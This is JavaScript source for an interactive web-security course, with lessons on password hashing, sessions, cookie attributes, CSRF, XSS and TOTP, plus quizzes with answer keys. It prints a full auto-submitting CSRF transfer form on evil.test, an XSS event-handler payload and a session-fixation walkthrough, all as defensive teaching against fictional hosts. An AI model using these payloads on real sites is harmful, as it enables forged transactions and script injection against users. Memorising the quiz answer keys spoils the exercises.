    <tr><td>3</td><td>https://evil.test</td><td>evil.test</td><td>alice only has a bank.test passkey</td><td>${waSel}</td><td class="fb"></td></tr>
    <tr><td>4</td><td>https://login.bank.test</td><td>bank.test</td><td>server expects only origin https://bank.test</td><td>${waSel}</td><td class="fb"></td></tr>
    <tr><td>5</td><td>https://login.bank.test</td><td>bank.test</td><td>server expects bank.test and login.bank.test</td><td>${waSel}</td><td class="fb"></td></tr>
  </table>
  <div class="row"><button id="check" class="primary">Check</button></div>
  <div id="result" class="result"></div>
</div>`;

  // ======================= LESSONS =======================
  const S = '2 · Passwords & Sessions';
  window.LESSONS.push(
    {
      id: 'password-storage',
      section: S,
      title: 'Storing passwords: hash, salt, slow',
      explain: `
<p>To check a password at login, the server has to remember <em>something</em> about it. The golden rule: <strong>assume your database will leak one day</strong> (a stolen backup, an SQL injection, a careless log). What the attacker finds must be as useless as possible.</p>
<h3>Step 1: hash, don’t store</h3>
<p>A <strong>hash function</strong> turns any input into a fixed-size fingerprint, and you can’t run it backwards. At login you hash what the user typed and compare fingerprints. Like a fingerprint scan: you can check a finger against it, but you can’t rebuild the finger from it.</p>
<h3>Step 2: salt</h3>
<p>Plain <code>SHA-256("123456")</code> is the same for everyone, so attackers keep giant precomputed tables (“rainbow tables”) of hashes of common passwords. A <strong>salt</strong> is a random value stored next to each user’s hash and mixed in: <code>hash(salt + password)</code>. Same password, different salt, completely different hash. Precomputed tables become useless.</p>
<h3>Step 3: slow</h3>
<p>SHA-256 is designed to be <em>fast</em>: a gaming GPU computes billions per second, so the attacker simply tries every common password for every user. Password hashing functions are deliberately <strong>slow and memory-hungry</strong>, with a tunable <em>work factor</em>:</p>
<ul>
  <li><strong>argon2id</strong>: first choice today (OWASP minimum: 19 MiB memory, 2 iterations, 1 lane).</li>
  <li><strong>scrypt</strong>: good alternative, also memory-hard.</li>
  <li><strong>bcrypt</strong>: fine for existing systems; cost ≥ 10; it ignores bytes after the 72nd.</li>
</ul>
<pre><code class="language-javascript">// Node.js, with the "argon2" package
const hash = await argon2.hash(password, { type: argon2.argon2id }); // salt is generated and embedded
const ok = await argon2.verify(storedHash, typedPassword);</code></pre>
<div class="warn">Never invent your own scheme, never encrypt passwords (whoever has the key has them all), and never use MD5/SHA-1/SHA-256 alone. Good libraries generate and store the salt for you inside the hash string.</div>
<div class="tip">No hash saves <code>123456</code>: it is in the first line of every attacker’s list. Slow hashing buys time; MFA and passkeys (lessons 2.6–2.7) remove the dependency on passwords.</div>
`,
      examples: [
        { title: 'Same password, four ways to store it', code: storeLab },
        {
          title: 'Breach simulator',
          code: breach,
          explain: `
<details><summary>What to try</summary>
<ol>
  <li>Choose <b>SHA-256 (no salt)</b> → <b>Run the attack</b>. alice and dave have the <em>same</em> hash: the attacker learns they share a password without cracking anything. The rainbow table cracks alice, bob, dave and frank instantly.</li>
  <li>Switch to <b>salted SHA-256</b>: the rainbow table finds 0 hits, and alice and dave now look different. But the per-user dictionary attack still takes about a millisecond per user.</li>
  <li>Switch to <b>salted argon2id</b>: same weak passwords fall eventually (they are at the top of every list), but the cost per user jumps to hours. carol’s and erin’s passwords stay safe.</li>
</ol></details>
<details><summary>Key idea: salt vs slowness solve different problems</summary>
<table><tr><th>Defense</th><th>Stops</th><th>Doesn’t stop</th></tr>
<tr><td>Hash</td><td>reading passwords directly</td><td>lookup tables, fast guessing</td></tr>
<tr><td>+ Salt</td><td>rainbow tables, spotting shared passwords, cracking all users at once</td><td>fast guessing of one user</td></tr>
<tr><td>+ Slow (argon2id)</td><td>fast guessing: every guess costs real time and memory</td><td>very common passwords</td></tr></table>
</details>`,
        },
      ],
      quiz: [
        { q: 'Why hash passwords instead of encrypting them?', options: ['Hashing is faster', 'A hash can’t be reversed, so there is no key that unlocks every password', 'Encryption is illegal', 'Hashes are shorter'], answer: 1, why: 'Encryption is reversible by design: whoever steals the key gets every password.' },
        { q: 'What does a per-user salt defeat?', options: ['Phishing', 'Precomputed rainbow tables and identical hashes for identical passwords', 'Keyloggers', 'Slow GPUs'], answer: 1, why: 'The salt makes every hash unique, so precomputation doesn’t help. It does not slow down guessing a single user.' },
        { q: 'Why is SHA-256 alone a poor password hash?', options: ['It has known collisions', 'It is too fast: attackers can try billions of guesses per second', 'Its output is too short', 'It needs a key'], answer: 1, why: 'SHA-256 is a fine hash for data integrity; for passwords, speed is the enemy.' },
        { q: 'Which is the recommended first choice for new systems in 2026?', options: ['MD5 with salt', 'bcrypt cost 4', 'argon2id', 'AES-256'], answer: 2, why: 'argon2id (memory-hard) is OWASP’s first recommendation; scrypt and bcrypt are acceptable alternatives.' },
      ],
      exercise: {
        task: `<p>A leaked row shows alice’s salt and salted SHA-256. Use the calculator in the box below to test the leaked common passwords, type alice’s password in the answer field, and click <b>Check</b>.</p>`,
        starter: W(crackHtml, crackExercise, { value: '' }),
        hint: 'Click each chip; the calculator turns red with MATCH for the right one.',
        solution: W(crackHtml, crackExercise, { value: 'dragon' }),
      },
    },
    {
      id: 'session-login',
      section: S,
      title: 'Form login & server sessions',
      explain: `
<p>This is the classic way websites have logged people in for 25+ years, and it is still a great choice. It combines what you have learned: an HTML form (1.1), POST over HTTPS (1.5), a password hash (2.1), and a cookie to beat statelessness (1.3).</p>
<ol>
  <li>Browser <code>POST /login</code> with <code>username=…&amp;password=…</code>.</li>
  <li>Server verifies the password hash.</li>
  <li>Server creates a <strong>session</strong>: a record in a <em>session store</em> (memory, Redis, database) under a long <strong>random id</strong>.</li>
  <li>Response: <code>303 See Other</code> + <code>Set-Cookie: sid=&lt;id&gt;; HttpOnly; Secure; SameSite=Lax; Path=/</code>.</li>
  <li>Every later request carries <code>Cookie: sid=&lt;id&gt;</code>; the server looks it up.</li>
  <li>Logout: <strong>delete the server record</strong> and expire the cookie.</li>
</ol>
<p>Think of a coat check: you hand over your coat (prove who you are once), get a numbered ticket (the session id), and the coat stays in the cloakroom (data stays on the server). Lose the ticket and anyone holding it gets your coat, so the ticket must be unguessable and well protected.</p>
<pre><code class="language-http">HTTP/1.1 303 See Other
Location: /dashboard
Set-Cookie: sid=q3Vx8Lk2…; Path=/; HttpOnly; Secure; SameSite=Lax</code></pre>
<h3>Rules for session ids</h3>
<ul>
  <li>At least 128 bits from a cryptographically secure random generator. Never a user id, counter or timestamp.</li>
  <li><strong>Issue a new id at login</strong> (and at any privilege change), or you’re open to <em>session fixation</em>.</li>
  <li>Expire them: an idle timeout (e.g. 30 min) and an absolute lifetime (e.g. 12 h).</li>
</ul>
<div class="tip">Server sessions make logout and “sign out all devices” trivial: delete the records. Self-contained tokens (JWTs, section 4) make that hard.</div>
`,
      examples: [
        {
          title: 'The full flow, plus session fixation',
          code: sessionSeq,
          explain: `
<details><summary>The problem: session fixation</summary>
<p>If the server keeps the <em>same</em> session id before and after login, an attacker who can get a known id into the victim’s browser just waits. When the victim logs in, that id becomes an authenticated session, and the attacker already has it. Ways to plant an id: apps that accept ids in the URL (<code>;jsessionid=…</code>), a compromised or user-controlled subdomain setting <code>Domain=shop.test</code> cookies, or an XSS on a sibling site.</p>
</details>
<details><summary>Step by step: “🕵 Session fixation (vulnerable)” vs “🛡 Fixed”</summary>
<table>
<tr><th>Step</th><th>Vulnerable tab</th><th>Session store</th></tr>
<tr><td>1–2</td><td>Attacker GET /login → <code>Set-Cookie: sid=ATTACKER-KNOWN-1234</code></td><td><code>ATTACKER-KNOWN-1234 → anonymous</code></td></tr>
<tr><td>3</td><td>plant sid in victim</td><td>Alice’s jar: same id</td></tr>
<tr><td>4–5</td><td>Alice POST /login with that cookie; password ✓, <b>keep same id</b></td><td><code>ATTACKER-KNOWN-1234 → user=alice</code></td></tr>
<tr><td>7–8</td><td>Attacker GET /dashboard with the id → <b>200 alice’s dashboard</b></td><td>unchanged</td></tr>
</table>
<table>
<tr><th>Step</th><th>Fixed tab</th><th>Session store</th></tr>
<tr><td>3</td><td>password ✓, <b>regenerate id</b></td><td>old id deleted, new random id → alice</td></tr>
<tr><td>4</td><td>303 + <code>Set-Cookie: sid=&lt;new&gt;</code></td><td>Alice’s jar now holds the new id</td></tr>
<tr><td>5–7</td><td>Attacker uses the old id → not found → 303 /login</td><td>–</td></tr>
</table>
</details>
<details><summary>Key lines (Express + express-session)</summary>
<pre><code class="language-javascript">app.post('/login', async (req, res, next) =&gt; {
  const user = await verify(req.body.username, req.body.password); // ① argon2id check
  if (!user) return res.status(200).render('login', { error: 'Invalid username or password' });
  req.session.regenerate((err) =&gt; {                                // ② new id, old one destroyed
    if (err) return next(err);
    req.session.userId = user.id;                                   // ③ data lives server-side
    res.redirect(303, '/dashboard');                                // ④ POST → 303 → GET
  });
});</code></pre>
<ol><li>① Same generic error for wrong user or wrong password.</li><li>② The fix for fixation.</li><li>③ The cookie carries only the id.</li><li>④ Avoids “resubmit form?” on reload.</li></ol>
</details>
<details><summary>Try this</summary>
<ul>
  <li>In the first tab, watch the two state cards at steps 5–6 and again at 11–12: server record and cookie appear together and disappear together.</li>
  <li>In the live mini-app below: log in, click <b>🔄 restart server</b>, then <b>visit /dashboard</b>. Your cookie still exists but points to nothing → redirected to login.</li>
  <li>Log in, <b>🧹 clear cookies</b>: the server record still exists (until it expires) but the browser can’t prove anything.</li>
</ul>
</details>`,
        },
        { title: 'Live mini-app: log in, look inside', code: liveLogin },
      ],
      quiz: [
        { q: 'What does the session cookie contain in a server-session design?', options: ['The username and role', 'The password hash', 'Only a random id pointing to data on the server', 'An encrypted copy of the password'], answer: 2, why: 'The cookie is a ticket number; the data stays in the server’s session store.' },
        { q: 'Which status should follow a successful form POST to /login?', options: ['200 with the dashboard HTML', '303 See Other to /dashboard', '401', '307 to /dashboard'], answer: 1, why: '303 forces a GET to the new location (Post/Redirect/Get). 307 would repeat the POST.' },
        { q: 'How do you prevent session fixation?', options: ['Use longer passwords', 'Issue a brand-new session id at login', 'Use GET for login', 'Store sessions in cookies'], answer: 1, why: 'Regenerating the id makes any id the attacker planted worthless.' },
        { q: 'What must logout do on the server?', options: ['Nothing, deleting the cookie is enough', 'Destroy the session record (and expire the cookie)', 'Change the user’s password', 'Return 401'], answer: 1, why: 'If only the cookie is deleted, a copied cookie would still work.' },
        { q: 'Why say “Invalid username or password” instead of “No such user”?', options: ['It’s shorter', 'It prevents attackers from discovering which usernames exist', 'Browsers require it', 'It’s faster to check'], answer: 1, why: 'Different messages leak account existence (user enumeration).' },
      ],
      exercise: {
        task: `<p>Write the <code>Set-Cookie</code> header for a fresh login in the box below and click <b>Check</b>. The requirements are listed in the widget.</p>`,
        starter: W(setCookieHtml, setCookieExercise, { value: 'Set-Cookie: sid=9fK2LmQx7Rt0' }),
        hint: 'Format: <code>Set-Cookie: name=value; Attr; Attr=value</code>. You need four attributes.',
        solution: W(setCookieHtml, setCookieExercise, { value: 'Set-Cookie: sid=9fK2LmQx7Rt0; Path=/; HttpOnly; Secure; SameSite=Lax' }),
      },
    },
    {
      id: 'cookie-attributes',
      section: S,
      title: 'Cookie attributes that protect you',
      explain: `
<p>A cookie is a <code>name=value</code> pair the browser stores for a site and sends back automatically. The <strong>attributes</strong> after the value are rules for the browser: <em>when</em> to send it, <em>to whom</em>, and <em>who</em> may read it. They are never sent back to the server.</p>
<table>
<tr><th>Attribute</th><th>Effect</th></tr>
<tr><td><code>HttpOnly</code></td><td>JavaScript can’t read it via <code>document.cookie</code> → XSS can’t steal it.</td></tr>
<tr><td><code>Secure</code></td><td>Only sent over HTTPS.</td></tr>
<tr><td><code>SameSite=Strict</code></td><td>Never sent on requests started by another site.</td></tr>
<tr><td><code>SameSite=Lax</code></td><td>Sent cross-site only on <b>top-level GET navigations</b> (clicking a link). The default in Chromium when not set.</td></tr>
<tr><td><code>SameSite=None</code></td><td>Sent everywhere. Requires <code>Secure</code>, otherwise rejected.</td></tr>
<tr><td><code>Domain=shop.test</code></td><td>Also sent to subdomains. Leave it out for a <em>host-only</em> cookie (safer).</td></tr>
<tr><td><code>Path=/account</code></td><td>Only sent for URLs under that path (organization, not security).</td></tr>
<tr><td><code>Max-Age=3600</code> / <code>Expires</code></td><td>Persist across restarts. None → session cookie. <code>Max-Age=0</code> deletes.</td></tr>
<tr><td><code>__Host-</code> name prefix</td><td>Browser only accepts it with <code>Secure</code>, <code>Path=/</code> and no <code>Domain</code>: locked to one host.</td></tr>
</table>
<p>“Site” here means scheme + registrable domain (lesson 1.6): <code>blog.shop.test</code> and <code>shop.test</code> are the <em>same site</em>; <code>evil.test</code> is cross-site.</p>
<div class="tip">Recommended session cookie in 2026: <code>__Host-sid=…; Path=/; Secure; HttpOnly; SameSite=Lax</code>.</div>
<div class="warn">Not every browser applies Lax when <code>SameSite</code> is missing (Firefox and Safari don’t by default). Always set it explicitly.</div>
`,
      examples: [
        {
          title: 'Cookie simulator: attributes × request contexts',
          code: cookieSim,
          explain: `
<details><summary>The problem: the browser attaches cookies for you, even when another site triggers the request</summary>
<p>Any page can make your browser send requests to shop.test: a link, a form, an image tag. Historically the browser attached shop.test’s cookies to all of them. That is how CSRF works. SameSite lets the cookie owner say “only attach me when the request comes from my own site”, with exceptions.</p>
</details>
<details><summary>Step by step: SameSite rules (rows of the simulator)</summary>
<table>
<tr><th>Row (context)</th><th>Strict</th><th>Lax / not set (Chromium)</th><th>None; Secure</th></tr>
<tr><td>Same-site link / fetch</td><td>sent</td><td>sent</td><td>sent</td></tr>
<tr><td>Cross-site link click (top-level GET)</td><td>not sent</td><td><b>sent</b></td><td>sent</td></tr>
<tr><td>Cross-site form POST</td><td>not sent</td><td><b>not sent</b> (unset: Chrome’s 2-minute “Lax+POST” exception)</td><td>sent → CSRF risk</td></tr>
<tr><td>Cross-site &lt;img&gt; / fetch</td><td>not sent</td><td>not sent</td><td>sent (Safari/Firefox block 3rd-party cookies by default)</td></tr>
<tr><td>blog.shop.test (same-site)</td><td colspan="3">SameSite allows it; but sent only if <code>Domain=shop.test</code></td></tr>
<tr><td>http://shop.test</td><td colspan="3">not sent if <code>Secure</code></td></tr>
<tr><td>document.cookie</td><td colspan="3">hidden if <code>HttpOnly</code></td></tr>
</table>
</details>
<details><summary>Key ideas</summary>
<ul>
  <li>Lax is the sweet spot for sessions: links from email/search still log you in, cross-site form posts don’t carry your session.</li>
  <li>Lax does <b>not</b> protect state-changing <b>GET</b> endpoints. Never change data on GET.</li>
  <li>Strict is stronger but users arriving via a link appear logged out on the first page.</li>
  <li>The browser <b>rejects</b> invalid combos silently: <code>SameSite=None</code> without <code>Secure</code>, <code>__Host-</code> with a Domain.</li>
</ul>
</details>
<details><summary>Try this</summary>
<ul>
  <li>Set SameSite to <b>None</b> and untick <b>Secure</b>: the cookie is rejected and every row goes red.</li>
  <li>Pick <b>__Host-sid</b>, then set Domain to shop.test: rejected. Clear Domain again.</li>
  <li>Set Path to <b>/account</b>: only the /account/orders row still gets it, and document.cookie on / no longer lists it.</li>
  <li>Set SameSite to <b>(not set)</b> and read the cross-site POST row about Chrome’s Lax+POST quirk.</li>
</ul>
</details>`,
        },
        { title: 'One cookie, five requests (animated)', code: cookieSeq },
      ],
      quiz: [
        { q: 'Which attribute stops <code>document.cookie</code> from revealing the session id?', options: ['<code>Secure</code>', '<code>HttpOnly</code>', '<code>SameSite=Strict</code>', '<code>Path=/</code>'], answer: 1, why: 'HttpOnly hides the cookie from JavaScript; the browser still sends it.' },
        { q: 'With <code>SameSite=Lax</code>, is the cookie sent when evil.test auto-submits a POST form to your site?', options: ['Yes', 'No', 'Only over HTTPS', 'Only if HttpOnly'], answer: 1, why: 'Lax allows cross-site top-level GET navigations only.' },
        { q: 'With <code>SameSite=Lax</code>, is the cookie sent when a user clicks a link to your site in an email (webmail page)?', options: ['Yes: top-level GET navigation', 'No: it’s cross-site', 'Only with Strict', 'Only for subdomains'], answer: 0, why: 'That’s why Lax doesn’t log out visitors coming from other sites.' },
        { q: 'A server sends <code>Set-Cookie: id=1; SameSite=None</code> (no Secure). What happens?', options: ['Works everywhere', 'The browser rejects the cookie', 'It becomes Lax', 'It becomes HttpOnly'], answer: 1, why: 'Modern browsers require Secure with SameSite=None.' },
        { q: 'What does the <code>__Host-</code> prefix guarantee?', options: ['The cookie is encrypted', 'It was set with Secure, Path=/ and no Domain, so it’s bound to exactly this host', 'It is HttpOnly', 'It expires in one hour'], answer: 1, why: 'Subdomains can’t set or overwrite a __Host- cookie for the parent.' },
      ],
      exercise: {
        task: `<p>Choose the cookie name and attributes in the box below so the bank’s session cookie meets all six requirements, then click <b>Check</b>.</p>`,
        starter: W(attrExHtml, attrExercise, { name: 'sid', ho: false, sec: false, ss: '', dom: 'bank.test', path: '/' }),
        hint: 'Requirement ⑤ is a name prefix. Requirements ③ + ④ together pick one SameSite value.',
        solution: W(attrExHtml, attrExercise, { name: '__Host-sid', ho: true, sec: true, ss: 'Lax', dom: '', path: '/' }),
      },
    },
    {
      id: 'csrf',
      section: S,
      title: 'CSRF: riding your session',
      explain: `
<p><strong>Cross-Site Request Forgery</strong>: a malicious site makes <em>your</em> browser send a request to a site where you are logged in. The browser helpfully attaches your cookies, so the request looks exactly like something you did.</p>
<p>Analogy: someone slips a pre-filled, pre-addressed transfer form into your outgoing mail. The bank sees your signature (the cookie) on the envelope and processes it.</p>
<pre><code class="language-html">&lt;!-- on https://evil.test --&gt;
&lt;form action="https://bank.test/transfer" method="POST"&gt;
  &lt;input type="hidden" name="to" value="mallory"&gt;
  &lt;input type="hidden" name="amount" value="5000"&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</code></pre>
<p>Note: the attacker never sees the response (Same-Origin Policy). They don’t need to: the transfer already happened.</p>
<h3>Defenses (use more than one)</h3>
<ul>
  <li><strong>SameSite=Lax/Strict cookies</strong>: the browser doesn’t attach the cookie to cross-site POSTs.</li>
  <li><strong>CSRF token</strong> (synchronizer token): a random value tied to the session, embedded in your own forms, checked on every state-changing request. evil.test can’t read your pages, so it can’t know the token.</li>
  <li><strong>Check <code>Origin</code> / <code>Sec-Fetch-Site</code></strong>: browsers stamp requests with where they came from; reject <code>cross-site</code> for state changes.</li>
  <li><strong>Never change state on GET</strong>: links and images can trigger GETs, and Lax allows top-level GETs.</li>
</ul>
<div class="warn">CORS doesn’t stop CSRF: form-like requests are sent without a preflight (lesson 1.6). APIs that only accept <code>Authorization: Bearer</code> headers (not cookies) aren’t vulnerable to classic CSRF, because browsers never add that header automatically.</div>
`,
      examples: [
        {
          title: 'Attack and three defenses',
          code: csrfSeq,
          explain: `
<details><summary>The problem: cookies are attached by destination, not by who asked</summary>
<p>Without SameSite restrictions, the browser decides whether to attach a cookie by looking only at the <em>target</em> (bank.test), not at the page that triggered the request (evil.test). The bank sees a valid session and a well-formed POST. Nothing in the classic request looks wrong, except the <code>Origin</code> header that old servers ignored.</p>
</details>
<details><summary>Step by step: compare the four tabs</summary>
<table>
<tr><th>Tab</th><th>Cookie sent?</th><th>Server check</th><th>Result</th></tr>
<tr><td>💥 Attack</td><td>yes (SameSite=None)</td><td>session only</td><td>$5,000 to mallory (watch the Bank card at step 5)</td></tr>
<tr><td>🛡 SameSite=Lax</td><td>no (cross-site POST)</td><td>no session</td><td>303 → /login</td></tr>
<tr><td>🛡 CSRF token</td><td>yes</td><td><code>csrf_token</code> missing</td><td>403 Forbidden</td></tr>
<tr><td>🛡 Origin check</td><td>yes</td><td><code>Sec-Fetch-Site: cross-site</code></td><td>403 Forbidden</td></tr>
</table>
</details>
<details><summary>Key ideas</summary>
<ul>
  <li>Tokens work because of the Same-Origin Policy: evil.test can <em>send</em> to bank.test but not <em>read</em> bank.test’s pages where the token lives.</li>
  <li><code>Origin</code> and <code>Sec-Fetch-*</code> are “forbidden headers”: page JavaScript can’t set or change them.</li>
  <li>XSS defeats all CSRF defenses: a script running on bank.test can read the token and its requests are same-origin (next lesson).</li>
</ul>
</details>
<details><summary>Try this (in the attack lab below)</summary>
<ul>
  <li>SameSite <b>None</b>, no defenses, attack “Auto-submitted form” → ATTACK SUCCEEDED.</li>
  <li>Switch to <b>Lax</b> → blocked. Now pick “Top-level redirect” and tick “(bad idea) accept GET” → it succeeds again: Lax lets top-level GETs through.</li>
  <li>Keep Lax + GET, tick the Origin/Sec-Fetch-Site check → blocked.</li>
  <li>Try <b>Strict</b> with every attack.</li>
</ul>
</details>`,
        },
        { title: 'Attack lab: toggle defenses', code: csrfLab },
      ],
      quiz: [
        { q: 'In a CSRF attack, what does the attacker usually NOT get?', options: ['The request sent', 'The victim’s cookie attached', 'The response content', 'The side effect'], answer: 2, why: 'The SOP hides the response, but the state change already happened.' },
        { q: 'Why can’t evil.test include the right CSRF token?', options: ['Tokens are encrypted', 'It can’t read bank.test pages, where the token is embedded', 'Browsers delete tokens', 'Tokens are in HttpOnly cookies only'], answer: 1, why: 'Same-Origin Policy blocks reading cross-origin responses.' },
        { q: 'Your transfer endpoint accepts <code>GET /transfer?to=…</code>. Does <code>SameSite=Lax</code> protect it from a malicious link?', options: ['Yes, fully', 'No: Lax sends cookies on top-level GET navigations', 'Only on mobile', 'Yes if HttpOnly'], answer: 1, why: 'Never change state with GET.' },
        { q: 'Which request header tells the server the request came from another site?', options: ['<code>Host</code>', '<code>Sec-Fetch-Site: cross-site</code>', '<code>Accept</code>', '<code>Cookie</code>'], answer: 1, why: 'Browsers add Fetch Metadata headers; <code>Origin</code> is the other useful one.' },
        { q: 'Does a strict CORS policy prevent CSRF?', options: ['Yes', 'No: simple cross-site requests (like form posts) are sent without asking CORS', 'Only for GET', 'Only with cookies'], answer: 1, why: 'CORS controls reading responses, not sending simple requests.' },
      ],
      exercise: {
        task: `<p>You are the bank’s CSRF filter. Mark each incoming <code>POST /transfer</code> in the box below as allow or block according to the policy shown, then click <b>Check</b>.</p>`,
        starter: W(csrfExHtml, csrfExercise, { fill: false }),
        hint: 'All three conditions must hold. If any one fails, block.',
        solution: W(csrfExHtml, csrfExercise, { fill: true }),
      },
    },
    {
      id: 'xss-token-theft',
      section: S,
      title: 'XSS & where to keep secrets',
      explain: `
<p><strong>Cross-Site Scripting (XSS)</strong> means the attacker’s JavaScript runs <em>inside your site’s origin</em>. It usually happens when user input is put into a page as HTML without escaping: a review, a username, a search term echoed back.</p>
<pre><code class="language-javascript">// ❌ vulnerable
review.innerHTML = data.text;      // "&lt;img src=x onerror=…&gt;" becomes a real element
// ✅ safe
review.textContent = data.text;    // shown as text</code></pre>
<p>Once the script runs as shop.test, it can do anything shop.test’s own code can:</p>
<ul>
  <li>Read <code>localStorage</code>, <code>sessionStorage</code> and non-HttpOnly cookies, and send them to the attacker.</li>
  <li>Make requests <em>as the user</em>: same-origin, cookies attached, CSRF token readable from the page.</li>
</ul>
<h3>So where should tokens live?</h3>
<table><tr><th>Storage</th><th>XSS can steal it?</th><th>XSS can use it while the page is open?</th></tr>
<tr><td>localStorage / sessionStorage</td><td>❌ yes, and reuse it elsewhere</td><td>yes</td></tr>
<tr><td>JS variable (memory)</td><td>⚠️ harder, but possible</td><td>yes</td></tr>
<tr><td><code>HttpOnly</code> cookie</td><td>✅ no</td><td>yes (requests carry it)</td></tr></table>
<p>HttpOnly turns “attacker steals a credential and uses it for days” into “attacker can act only while the victim’s tab is open”. That’s a real improvement, but not a fix.</p>
<h3>Actually preventing XSS</h3>
<ul>
  <li>Escape output by default (React, Vue, templating engines do), avoid <code>innerHTML</code> / <code>dangerouslySetInnerHTML</code>, sanitize HTML you must allow (DOMPurify).</li>
  <li><strong>Content-Security-Policy</strong>, e.g. <code>script-src 'self'</code> or nonces: the browser refuses inline scripts and handlers.</li>
  <li>Trusted Types (Chromium) to lock down dangerous DOM sinks.</li>
</ul>
<div class="warn">No storage location makes an XSS-infected page safe. Keep long-lived secrets out of JavaScript’s reach and prevent the XSS.</div>
`,
      examples: [
        { title: 'XSS simulator: what can the injected script reach?', code: xssLab,
          explain: `
<details><summary>What to try</summary>
<ol>
  <li>Default: <b>steal cookie</b> with HttpOnly on → attacker gets only <code>theme=light</code>. Untick HttpOnly, post again → the sid is stolen.</li>
  <li><b>steal localStorage</b> → the access token is stolen regardless of HttpOnly.</li>
  <li><b>act as user</b> → even with HttpOnly, the email change succeeds: the request comes from the victim’s own browser.</li>
  <li><b>&lt;script&gt; tag</b> → nothing runs (innerHTML doesn’t execute script elements), but that won’t save you: event handlers do run.</li>
  <li>Switch rendering to <b>textContent</b> or tick <b>CSP</b> → every payload is neutralized.</li>
</ol></details>` },
        { title: 'Stored XSS: localStorage vs HttpOnly (animated)', code: xssSeq },
      ],
      quiz: [
        { q: 'An XSS payload runs on shop.test. Which can it read?', options: ['HttpOnly cookies', 'localStorage of shop.test', 'Cookies of bank.test', 'The server’s session store'], answer: 1, why: 'Same origin → full access to localStorage. HttpOnly cookies and other origins stay out of reach.' },
        { q: 'Your session cookie is HttpOnly. Can an XSS still change the user’s email?', options: ['No, HttpOnly blocks it', 'Yes: its same-origin requests automatically carry the cookie', 'Only with CORS', 'Only on GET'], answer: 1, why: 'HttpOnly stops theft, not use.' },
        { q: 'Which rendering is safe for user-supplied text?', options: ['<code>el.innerHTML = text</code>', '<code>el.textContent = text</code>', '<code>document.write(text)</code>', '<code>el.outerHTML = text</code>'], answer: 1, why: 'textContent never parses HTML.' },
        { q: 'What does <code>Content-Security-Policy: script-src \'self\'</code> block?', options: ['All JavaScript', 'Inline scripts/handlers and scripts from other origins', 'Cookies', 'Images'], answer: 1, why: 'Only scripts from the page’s own origin may run, and inline code is refused unless allowed with a nonce or hash.' },
      ],
      exercise: {
        task: `<p>Write the HTML-escaped version of the malicious review in the box below so it is displayed as text, then click <b>Check</b>.</p>`,
        starter: W(escExHtml, escExercise, { value: '<img src=x onerror=alert(1)>' }),
        hint: 'Only two characters need replacing here: <code>&lt;</code> → <code>&amp;lt;</code> and <code>&gt;</code> → <code>&amp;gt;</code>.',
        solution: W(escExHtml, escExercise, { value: '&lt;img src=x onerror=alert(1)&gt;' }),
      },
    },
    {
      id: 'mfa-totp',
      section: S,
      title: 'MFA & TOTP codes',
      explain: `
<p>Passwords leak, get reused and get phished. <strong>Multi-factor authentication</strong> adds a factor of a different kind (lesson 1.4), most often “something you have”: your phone.</p>
<h3>How the 6-digit codes work (TOTP, RFC 6238)</h3>
<p>At enrollment the server creates a random <strong>secret</strong> and shows it as a QR code: <code>otpauth://totp/Shop:alice?secret=JBSWY3DPEHPK3PXP&amp;issuer=Shop</code>. Your authenticator app stores it. From then on, phone and server never need to talk: both compute</p>
<pre><code>T    = floor(unix_time / 30)                          // which 30-second window
code = Truncate( HMAC(secret, T as 8 bytes) ) mod 10^6  // 6 digits</code></pre>
<p>Same secret + same clock = same code. A code is only valid for its 30-second window (servers usually also accept the previous and next window to tolerate clock drift) and should be accepted only once.</p>
<p>TOTP is HOTP (RFC 4226, counter-based codes) with time as the counter. RFC 6238’s default HMAC is <strong>SHA-1</strong> and most apps use it; RFC 6238 also allows SHA-256 and SHA-512. The demo uses <strong>HMAC-SHA-256</strong> because that’s what our helper library implements.</p>
<h3>Flow</h3>
<p>Password ✓ → session marked “MFA pending” → code ✓ → session upgraded (and its id rotated). Never grant access between the two steps.</p>
<div class="warn"><strong>OTP codes are phishable.</strong> A fake login page can ask for your code and relay it to the real site within seconds. SMS codes add SIM-swap risk. For phishing resistance, use passkeys / security keys (next lesson).</div>
<div class="tip">Also: rate-limit code attempts (only 1,000,000 possibilities), store the secret encrypted, and give users recovery codes.</div>
`,
      examples: [
        {
          title: 'Live TOTP generator & verifier',
          code: totpLab,
          explain: `
<details><summary>The problem: proving you hold the phone without a network</summary>
<p>The server wants proof that the user has the device enrolled earlier. The phone may be offline. Solution: both sides share a secret and both know the time, so both can derive the same short-lived number. Seeing one code doesn’t reveal the secret (HMAC is one-way), and the code expires quickly.</p>
</details>
<details><summary>Step by step: the “How the phone computed it” table</summary>
<table>
<tr><th>Row</th><th>What happens</th><th>Changes when</th></tr>
<tr><td>①</td><td>Unix time on the phone (with your drift slider)</td><td>every second</td></tr>
<tr><td>②</td><td><code>T = floor(time / 30)</code></td><td>every 30 s (ring resets)</td></tr>
<tr><td>③</td><td>T written as 8 bytes, big-endian</td><td>with T</td></tr>
<tr><td>④</td><td>HMAC-SHA-256(secret, counter) → 32 bytes</td><td>with T or secret</td></tr>
<tr><td>⑤</td><td>Dynamic truncation: low 4 bits of the last byte (yellow) pick an offset; take 4 bytes there (blue), drop the top bit</td><td>with the HMAC</td></tr>
<tr><td>⑥</td><td>mod 1,000,000 → the 6 digits on screen</td><td>with T</td></tr>
</table>
<p>The self-test line runs the same code on RFC 6238’s official SHA-256 test vector, so you know the math is real.</p>
</details>
<details><summary>Key ideas: windows, drift and replay</summary>
<ul>
  <li>The server checks T−1, T and T+1. A phone clock off by up to ~30 s still works.</li>
  <li>After a successful login the server remembers the step used and rejects the same code again (replay).</li>
  <li>A bigger window is more convenient but gives a phisher more time and a guesser more valid codes.</li>
</ul>
</details>
<details><summary>Try this</summary>
<ul>
  <li>Click <b>copy phone code ↓</b> then <b>Verify</b> → accepted at step T. Click <b>Verify</b> again → <b>replay</b>.</li>
  <li>Drag the drift slider to <b>+30 s</b>, copy, verify → accepted as T+1. Try <b>+60 s</b> → rejected.</li>
  <li>Click <b>⏩ jump +30 s</b>: phone and server both move forward. A new code appears, and the old one would now be T−1.</li>
  <li>Click 🎲 for a new secret: the phone’s code changes completely while T stays the same.</li>
</ul>
</details>`,
        },
        { title: 'Login with a second factor, and the phishing relay', code: mfaSeq },
      ],
      quiz: [
        { q: 'What do the phone and server share to generate the same TOTP code?', options: ['The password', 'A secret key and the current time', 'An SMS channel', 'A public key'], answer: 1, why: 'Shared secret + synchronized clock. No network needed on the phone.' },
